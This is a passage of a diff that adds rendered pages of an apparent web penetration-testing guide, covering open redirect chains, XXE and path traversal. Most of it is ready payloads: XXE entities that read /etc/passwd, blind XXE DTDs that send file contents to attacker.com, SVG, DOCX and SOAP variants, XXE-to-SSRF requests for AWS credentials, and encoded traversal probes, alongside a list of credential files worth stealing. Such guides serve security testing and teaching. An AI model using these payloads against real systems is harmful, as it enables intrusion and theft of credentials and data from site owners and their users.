+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>2. Provider sends code to: https://target.com/goto?url=https://attacker.com?code=AUTH_CODE
+</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a>3. target.com redirects to: https://attacker.com?code=AUTH_CODE
+</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>4. Attacker receives auth code → ATO
+</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a>
+</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a>Why it works: redirect_uri validation passes (starts with target.com)
+</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a>but the code ends up at attacker.com via the open redirect
+</span></code></pre></div>
+<p><strong>Chain 2 — Open Redirect + SSRF filter bypass:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>SSRF filter: URL must be on an allowed domain (target.com)
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>Open redirect at: target.com/redirect?to=
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>?url=https://target.com/redirect?to=http://169.254.169.254/meta-data/
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>Server fetches target.com/redirect → gets 302 → follows to metadata endpoint
+</span></code></pre></div>
+<p><strong>Chain 3 — Open Redirect + Phishing:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>Email link: https://target.com/login?next=https://evil-clone.com
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>User sees legitimate target.com in the URL → trusts it → clicks
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>→ Redirected to convincing clone
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>Severity: Medium (document the social engineering component)
+</span></code></pre></div>
+<div class="admonition info">
+<p class="admonition-title">JavaScript redirects are DOM XSS</p>
+<p>If the redirect is implemented as <code>window.location = param</code>, that's DOM XSS territory — report it as DOM XSS (higher severity) not open redirect.</p>
+</div>
+<hr />
+<h2 id="53-xxe-xml-external-entity">5.3 XXE (XML External Entity)<a class="headerlink" href="#53-xxe-xml-external-entity" title="Permanent link">&para;</a></h2>
+<p>XML parsers support external entities — references to resources outside the XML document. If the parser processes user-supplied XML, an attacker can define entities that read local files, trigger SSRF, or exfiltrate data via OOB channels.</p>
+<h3 id="531-classic-file-read">5.3.1 Classic File Read<a class="headerlink" href="#531-classic-file-read" title="Permanent link">&para;</a></h3>
+<div class="language-xml highlight"><span class="filename">basic_xxe.xml</span><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="cp">&lt;!DOCTYPE foo [</span>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>]&gt;
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="nt">&lt;root&gt;</span>
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="w">  </span><span class="nt">&lt;data&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/data&gt;</span>
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><span class="filename">xxe_detection.sh</span><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>https://target.com/api/parse<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/xml&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;&#39;</span>
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="c1"># Look for: root:x:0:0:root:/root:/bin/bash in response</span>
+</span></code></pre></div>
+<p><strong>High-value files to read:</strong></p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Contents</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/etc/passwd</code></td>
+<td>User accounts — confirms LFI</td>
+</tr>
+<tr>
+<td><code>/etc/hosts</code></td>
+<td>Internal hostnames</td>
+</tr>
+<tr>
+<td><code>/proc/self/environ</code></td>
+<td>Environment variables (often contain secrets)</td>
+</tr>
+<tr>
+<td><code>/proc/self/cmdline</code></td>
+<td>Running process command</td>
+</tr>
+<tr>
+<td><code>/app/config/database.yml</code></td>
+<td>DB credentials</td>
+</tr>
+<tr>
+<td><code>/home/&lt;user&gt;/.aws/credentials</code></td>
+<td>AWS keys</td>
+</tr>
+<tr>
+<td><code>/root/.ssh/id_rsa</code></td>
+<td>Root SSH private key</td>
+</tr>
+<tr>
+<td><code>/.env</code></td>
+<td>Environment file</td>
+</tr>
+<tr>
+<td><code>C:\Windows\win.ini</code></td>
+<td>Windows target confirmation</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="532-blind-xxe-oob-via-dtd">5.3.2 Blind XXE (OOB via DTD)<a class="headerlink" href="#532-blind-xxe-oob-via-dtd" title="Permanent link">&para;</a></h3>
+<p>The parser processes the entity but doesn't return content in the response. Use OOB exfiltration — the server makes a DNS/HTTP request to your server carrying the data.</p>
+<div class="language-xml highlight"><span class="filename">evil.dtd</span><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="cm">&lt;!-- Host this at https://attacker.com/evil.dtd --&gt;</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="cp">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="cp">&lt;!ENTITY % exfil &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;https://attacker.com/?data=%file;&#39;&gt;</span>&quot;&gt;
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>%exfil;
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>%send;
+</span></code></pre></div>
+<div class="language-xml highlight"><span class="filename">blind_xxe_payload.xml</span><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="cm">&lt;!-- Payload sent to target --&gt;</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="cp">&lt;!DOCTYPE foo [</span>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="cp">  &lt;!ENTITY % xxe SYSTEM &quot;https://attacker.com/evil.dtd&quot;&gt;</span>
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="w">  </span>%xxe;
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>]&gt;
+</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="nt">&lt;root&gt;&lt;data&gt;</span>test<span class="nt">&lt;/data&gt;&lt;/root&gt;</span>
+</span></code></pre></div>
+<div class="language-xml highlight"><span class="filename">php_filter_exfil.xml</span><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="cm">&lt;!-- For files with special characters — base64 encode via PHP wrapper --&gt;</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="cp">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;</span>
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="cp">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;https://attacker.com/?x=%file;&#39;&gt;</span>&quot;&gt;
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>%eval;
+</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>%exfil;
+</span></code></pre></div>
+<div class="language-bash highlight"><span class="filename">xxe_oob_confirm.sh</span><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="c1"># Simple DNS confirmation — no DTD needed, just confirms XXE:</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>https://target.com/api<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/xml&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;http://abc123.interactsh.com/xxe&quot;&gt;]&gt;&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;&#39;</span>
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="c1"># HTTP interaction received = XXE confirmed</span>
+</span></code></pre></div>
+<hr />
+<h3 id="533-xxe-via-file-upload">5.3.3 XXE via File Upload<a class="headerlink" href="#533-xxe-via-file-upload" title="Permanent link">&para;</a></h3>
+<p>File formats that contain XML — all are potential XXE vectors when parsed server-side.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="3:2"><input checked="checked" id="__tabbed_3_1" name="__tabbed_3" type="radio" /><input id="__tabbed_3_2" name="__tabbed_3" type="radio" /><div class="tabbed-labels"><label for="__tabbed_3_1">SVG upload</label><label for="__tabbed_3_2">DOCX / XLSX</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-xml highlight"><span class="filename">xxe_payload.svg</span><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="cm">&lt;!-- Upload as image.svg --&gt;</span>
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span>
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>]&gt;
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="nt">&lt;svg</span><span class="w"> </span><span class="na">width=</span><span class="s">&quot;500px&quot;</span><span class="w"> </span><span class="na">height=</span><span class="s">&quot;500px&quot;</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="nt">&gt;</span>
+</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="w">  </span><span class="nt">&lt;text</span><span class="w"> </span><span class="na">font-size=</span><span class="s">&quot;16&quot;</span><span class="w"> </span><span class="na">x=</span><span class="s">&quot;0&quot;</span><span class="w"> </span><span class="na">y=</span><span class="s">&quot;16&quot;</span><span class="nt">&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/text&gt;</span>
+</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="nt">&lt;/svg&gt;</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">docx_xxe.sh</span><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="c1"># Office Open XML formats are ZIP files containing XML</span>
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>mkdir<span class="w"> </span>docx_xxe<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>cp<span class="w"> </span>test.docx<span class="w"> </span>docx_xxe/
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="nb">cd</span><span class="w"> </span>docx_xxe<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>unzip<span class="w"> </span>test.docx
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="c1"># Edit word/document.xml — inject at top:</span>
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a><span class="c1"># &lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a><span class="c1"># &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span>
+</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a><span class="c1"># Insert &amp;xxe; in document body</span>
+</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a>
+</span><span id="__span-28-10"><a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a><span class="c1"># Rezip:</span>
+</span><span id="__span-28-11"><a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a>zip<span class="w"> </span>-r<span class="w"> </span>../malicious.docx<span class="w"> </span>.
+</span><span id="__span-28-12"><a id="__codelineno-28-12" name="__codelineno-28-12" href="#__codelineno-28-12"></a>
+</span><span id="__span-28-13"><a id="__codelineno-28-13" name="__codelineno-28-13" href="#__codelineno-28-13"></a><span class="c1"># Upload — if app parses/previews server-side → XXE fires</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>File types to test on any upload endpoint:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>.xml  .svg  .html  .xhtml  .docx  .xlsx  .pptx
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>.odt  .ods  .rss   .atom   .kml   .gpx   .wsdl
+</span></code></pre></div>
+<hr />
+<h3 id="534-soap-endpoints">5.3.4 SOAP Endpoints<a class="headerlink" href="#534-soap-endpoints" title="Permanent link">&para;</a></h3>
+<p>SOAP is XML by design — always test for XXE on any SOAP endpoint.</p>
+<div class="language-xml highlight"><span class="filename">soap_xxe.xml</span><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>POST<span class="w"> </span>/api/soap<span class="w"> </span>HTTP/1.1
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>Content-Type:<span class="w"> </span>text/xml;<span class="w"> </span>charset=utf-8
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>SOAPAction:<span class="w"> </span>&quot;getUserInfo&quot;
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a><span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>]&gt;
+</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a><span class="nt">&lt;soap:Envelope</span><span class="w"> </span><span class="na">xmlns:soap=</span><span class="s">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span><span class="nt">&gt;</span>
+</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a><span class="w">  </span><span class="nt">&lt;soap:Body&gt;</span>
+</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a><span class="w">    </span><span class="nt">&lt;getUserInfo&gt;</span>
+</span><span id="__span-30-10"><a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a><span class="w">      </span><span class="nt">&lt;userId&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/userId&gt;</span>
+</span><span id="__span-30-11"><a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a><span class="w">    </span><span class="nt">&lt;/getUserInfo&gt;</span>
+</span><span id="__span-30-12"><a id="__codelineno-30-12" name="__codelineno-30-12" href="#__codelineno-30-12"></a><span class="w">  </span><span class="nt">&lt;/soap:Body&gt;</span>
+</span><span id="__span-30-13"><a id="__codelineno-30-13" name="__codelineno-30-13" href="#__codelineno-30-13"></a><span class="nt">&lt;/soap:Envelope&gt;</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><span class="filename">wsdl_discovery.sh</span><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="c1"># WSDL describes all operations and parameters:</span>
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;https://target.com/service?wsdl&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;operation\|message\|element&quot;</span>
+</span></code></pre></div>
+<hr />
+<h3 id="535-xxe-ssrf">5.3.5 XXE → SSRF<a class="headerlink" href="#535-xxe-ssrf" title="Permanent link">&para;</a></h3>
+<div class="language-xml highlight"><span class="filename">xxe_to_ssrf.xml</span><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="cm">&lt;!-- AWS metadata via XXE: --&gt;</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/&quot;&gt;</span>]&gt;
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="nt">&lt;root&gt;&lt;data&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/data&gt;&lt;/root&gt;</span>
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="cm">&lt;!-- Internal port probe: --&gt;</span>
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a><span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:6379/&quot;&gt;</span>]&gt;
+</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="nt">&lt;root&gt;&lt;data&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/data&gt;&lt;/root&gt;</span>
+</span></code></pre></div>
+<hr />
+<h3 id="536-xxe-checklist">5.3.6 XXE Checklist<a class="headerlink" href="#536-xxe-checklist" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>□ All XML-accepting endpoints → basic file read payload
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>□ Content-Type: application/xml or text/xml → always test
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>□ JSON endpoint → try switching to XML (change Content-Type, restructure body)
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>□ File uploads: SVG, DOCX, XLSX, PPTX, XML
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>□ SOAP endpoints: WSDL discovery first, XXE in every field
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>□ Blind XXE: DTD-based OOB via interactsh
+</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>□ PHP targets: php://filter wrapper for base64 exfil
+</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>□ XXE → SSRF: target metadata endpoint after confirming XXE
+</span></code></pre></div>
+<hr />
+<h2 id="54-local-file-inclusion--path-traversal">5.4 Local File Inclusion / Path Traversal<a class="headerlink" href="#54-local-file-inclusion--path-traversal" title="Permanent link">&para;</a></h2>
+<p>User-controlled input is used to construct a file path on the server. An attacker injects <code>../</code> sequences to escape the intended directory and read arbitrary files.</p>
+<h3 id="541-detection">5.4.1 Detection<a class="headerlink" href="#541-detection" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">traversal_probes.sh</span><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="c1"># Basic probes:</span>
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>?file<span class="o">=</span>../../etc/passwd
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>?path<span class="o">=</span>../../../etc/passwd
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>?template<span class="o">=</span>../../../../etc/shadow
+</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>?page<span class="o">=</span>../../etc/passwd%00<span class="w">      </span><span class="c1"># null byte for old PHP</span>
+</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a>
+</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a><span class="c1"># File download endpoints:</span>
+</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a>GET<span class="w"> </span>/download?name<span class="o">=</span>../../etc/passwd
+</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a>GET<span class="w"> </span>/api/files/../../etc/passwd
+</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a>
+</span><span id="__span-34-11"><a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a><span class="c1"># Windows targets:</span>
+</span><span id="__span-34-12"><a id="__codelineno-34-12" name="__codelineno-34-12" href="#__codelineno-34-12"></a>?file<span class="o">=</span>..<span class="se">\.</span>.<span class="se">\w</span>indows<span class="se">\w</span>in.ini
+</span><span id="__span-34-13"><a id="__codelineno-34-13" name="__codelineno-34-13" href="#__codelineno-34-13"></a>?file<span class="o">=</span>..<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\b</span>oot.ini
+</span><span id="__span-34-14"><a id="__codelineno-34-14" name="__codelineno-34-14" href="#__codelineno-34-14"></a>
+</span><span id="__span-34-15"><a id="__codelineno-34-15" name="__codelineno-34-15" href="#__codelineno-34-15"></a><span class="c1"># URL encoded:</span>
+</span><span id="__span-34-16"><a id="__codelineno-34-16" name="__codelineno-34-16" href="#__codelineno-34-16"></a>?file<span class="o">=</span>..%2F..%2Fetc%2Fpasswd
+</span><span id="__span-34-17"><a id="__codelineno-34-17" name="__codelineno-34-17" href="#__codelineno-34-17"></a>?file<span class="o">=</span>..%252F..%252Fetc%252Fpasswd<span class="w">     </span><span class="c1"># double encoded</span>
+</span><span id="__span-34-18"><a id="__codelineno-34-18" name="__codelineno-34-18" href="#__codelineno-34-18"></a>?file<span class="o">=</span>%2e%2e%2f%2e%2e%2fetc%2fpasswd
+</span></code></pre></div>
+<div class="language-bash highlight"><span class="filename">quick_confirm.sh</span><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;https://target.com/download?file=../../etc/passwd&quot;</span>
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="c1"># Look for: root:x:0:0: in response</span>
+</span></code></pre></div>
+<hr />
+<h3 id="542-filter-bypass">5.4.2 Filter Bypass<a class="headerlink" href="#542-filter-bypass" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">traversal_filter_bypass.sh</span><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="c1"># Encoding variants:</span>
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>..%2F<span class="w">              </span><span class="c1"># URL encoded /</span>
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>..%252F<span class="w">            </span><span class="c1"># double URL encoded</span>
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>..%c0%af<span class="w">           </span><span class="c1"># overlong UTF-8 encoding of /</span>
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>
+</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a><span class="c1"># Nested traversal (if filter strips ../ once):</span>
+</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a>....//<span class="w">             </span><span class="c1"># after stripping ../ → ../</span>
+</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a>....<span class="se">\/</span>
